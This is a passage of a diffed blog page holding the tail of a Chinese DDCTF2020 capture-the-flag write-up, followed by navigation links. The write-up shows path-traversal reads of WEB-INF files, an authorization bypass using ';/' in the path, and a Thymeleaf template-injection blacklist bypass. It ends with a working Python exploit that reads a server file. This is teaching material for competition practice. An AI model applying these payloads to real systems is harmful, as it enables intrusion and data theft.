-  &lt;!-- 声明自动为spring容器中那些配置@Aspectj切面的bean创建代理，织入切面 --&gt;
-  &lt;aop:aspectj-autoproxy&gt;&lt;/aop:aspectj-autoproxy&gt;
-  &lt;!-- 支持事物注解（@Transactional） --&gt;
-  &lt;tx:annotation-driven/&gt;
-  &lt;bean id=&quot;viewResolver&quot; class=&quot;org.thymeleaf.spring4.view.ThymeleafViewResolver&quot;&gt;
-    &lt;property name=&quot;order&quot; value=&quot;1&quot;/&gt;
-    &lt;property name=&quot;characterEncoding&quot; value=&quot;UTF-8&quot;/&gt;
-    &lt;property name=&quot;templateEngine&quot; ref=&quot;templateEngine&quot;/&gt;
-  &lt;/bean&gt;
-  &lt;bean id=&quot;templateEngine&quot; class=&quot;org.thymeleaf.spring4.SpringTemplateEngine&quot;&gt;
-    &lt;property name=&quot;templateResolver&quot; ref=&quot;templateResolver&quot; /&gt;
-  &lt;/bean&gt;
-  &lt;bean id=&quot;templateResolver&quot; class=&quot;org.thymeleaf.spring4.templateresolver.SpringResourceTemplateResolver&quot;&gt;
-    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/templates/&quot;/&gt;
-    &lt;property name=&quot;suffix&quot; value=&quot;.html&quot;/&gt;
-    &lt;property name=&quot;templateMode&quot; value=&quot;HTML5&quot;/&gt;
-    &lt;property name=&quot;cacheable&quot; value=&quot;false&quot;/&gt;
-    &lt;property name=&quot;characterEncoding&quot;  value=&quot;UTF-8&quot; /&gt;
-  &lt;/bean&gt;
-  &lt;context:annotation-config /&gt;
-  &lt;context:component-scan base-package=&quot;com.ctf&quot;&gt;
-    &lt;context:include-filter type=&quot;annotation&quot; expression=&quot;org.springframework.stereotype.Service&quot; /&gt;
-    &lt;context:include-filter type=&quot;annotation&quot; expression=&quot;org.springframework.stereotype.Repository&quot; /&gt;
-  &lt;/context:component-scan&gt;
-&lt;/beans&gt;</code></pre>
-<p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-web.xml" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-web.xml</a></p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
-xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
-xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
-xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;
-xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;&gt;
-  &lt;!-- 自动扫描 Controller 包 --&gt;
-  &lt;context:component-scan base-package=&quot;com.ctf.controller&quot;/&gt;
-  &lt;context:component-scan base-package=&quot;com.ctf.repository&quot;/&gt;
-  &lt;context:component-scan base-package=&quot;com.ctf.service&quot;/&gt;
-  &lt;!-- 注解配置和乱码处理 --&gt;
-  &lt;mvc:annotation-driven&gt;
-    &lt;mvc:message-converters&gt;
-      &lt;bean class=&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;&gt;
-        &lt;constructor-arg value=&quot;UTF-8&quot;/&gt;
-      &lt;/bean&gt;
-    &lt;/mvc:message-converters&gt;
-  &lt;/mvc:annotation-driven&gt;
-  &lt;mvc:default-servlet-handler/&gt;
-&lt;/beans&gt;</code></pre>
-<p>猜测他们的Auth，Login等对应的Controller类名<br><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class</a></p>
-</li>
-</ol>
-<p>   <a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class</a></p>
-<p>   拿到Admin的路由：<code>http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index</code>，同样权限绕过<br>   发现提示Render，盲猜又是SSTI</p>
-<p>   检测JAVA的SSTI发现<code>[[${7*7}]]</code>成功执行，这是一个Thymeleaf 模板注入</p>
-<p>进入下一步SSTI</p>
-<p>ctfFilter过滤了：</p>
-<pre><code class="java">private static String[] blacklists = { &quot;java.+lang&quot;, &quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#39;&quot;, &quot;exec.*\\(&quot;, &quot;write|read&quot;, &quot;invoke.*\\(&quot;, &quot;\\.forName.*\\(&quot;, &quot;lookup.*\\(&quot;, &quot;\\.getMethod.*\\(&quot;, &quot;javax.+script.+ScriptEngineManager&quot;, &quot;com.+fasterxml&quot;, &quot;org.+apache&quot;, &quot;org.+hibernate&quot;, &quot;org.+thymeleaf&quot;, &quot;javassist&quot;, &quot;javax\\.&quot;, &quot;eval.*\\(&quot;, &quot;\\.getClass\\(&quot;, &quot;org.+springframework&quot;, &quot;javax.+el&quot;, &quot;java.+io&quot; };</code></pre>
-<p>利用Thymeleaf 特性绕过</p>
-<p><code>[[*{__${#strings.replace(param.foo[0],param.bbb[0],param.t[0])}__}]]</code></p>
-<p>exp:</p>
-<pre><code class="python">import requests
-import re
-import gen
-#  private static String[] blacklists = { &quot;java.+lang&quot;, &quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#39;&quot;, &quot;exec.*\\(&quot;, &quot;write|read&quot;, &quot;invoke.*\\(&quot;, &quot;\\.forName.*\\(&quot;, 
-# &quot;lookup.*\\(&quot;, &quot;\\.getMethod.*\\(&quot;, 
-# &quot;javax.+script.+ScriptEngineManager&quot;, &quot;com.+fasterxml&quot;, &quot;org.+apache&quot;, &quot;org.+hibernate&quot;, &quot;org.+thymeleaf&quot;, &quot;javassist&quot;, &quot;javax\\.&quot;, &quot;eval.*\\(&quot;, &quot;\\.getClass\\(&quot;,
-#  &quot;org.+springframework&quot;, &quot;javax.+el&quot;, &quot;java.+io&quot; };
-
-code = &quot;param.foo&quot;
-payload =&#39;&#39;&#39;&lt;p th:text=${%s}&gt;&lt;/p&gt;&#39;&#39;&#39;%code
-cmd=payload
-cmd=&quot;&quot;&quot;[[*{__${#strings.replace(param.foo[0],param.bbb[0],param.t[0])}__}]] &quot;&quot;&quot;
-print(cmd)
-burp0_url = &quot;http://116.85.37.131:80/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize&quot;
-burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://116.85.37.131&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
-burp0_data = {&quot;content&quot;: cmd}
-response=requests.post(burp0_url, headers=burp0_headers, data=burp0_data).text
-
-try:
-    redirect = re.search(&#39;fetch \./(.*) !&#39;, response).group(1)
-except :
-    print(response)
-url = &#39;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/&#39;
-url += redirect
-
-print(requests.get(url,params={&quot;foo&quot;:&quot;NEW java.util.Scanner(NEW java.i@o.BufferedRea@der(new java.i@o.Fi@leRe@ad@er(new java.i@o.Fi@le(&quot;+gen.gen(&quot;/flag_is_here&quot;)+&quot;)))).nextLine()&quot;,&quot;bbb&quot;:&#39;@&#39;,&quot;t&quot;:&quot;&quot;,&#39;g&#39;:&#39;ls&#39;},proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text)</code></pre>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/09/07/DDCTF2020/">http://blog.ccreater.top/2020/09/07/DDCTF2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/09/07/DDCTF2020/" data-id="ckesiopjm0000nsv06tz7fto8" data-title="DDCTF2020" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -3167,6 +2872,10 @@ print(requests.get(url,params={&quot;foo&quot;:&quot;NEW java.util.Scanner(NEW j
       <ul>
         
           <li>
+            <a href="/2020/10/26/2020ByteCTF/">2020ByteCTF</a>
+          </li>
+        
+          <li>
             <a href="/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
           </li>
         
@@ -3180,10 +2889,6 @@ print(requests.get(url,params={&quot;foo&quot;:&quot;NEW java.util.Scanner(NEW j
         
           <li>
             <a href="/2020/10/15/Service%20Worker/">Service Worker</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/">FastJson1.2.24调试记录_复现</a>
           </li>
         
       </ul>
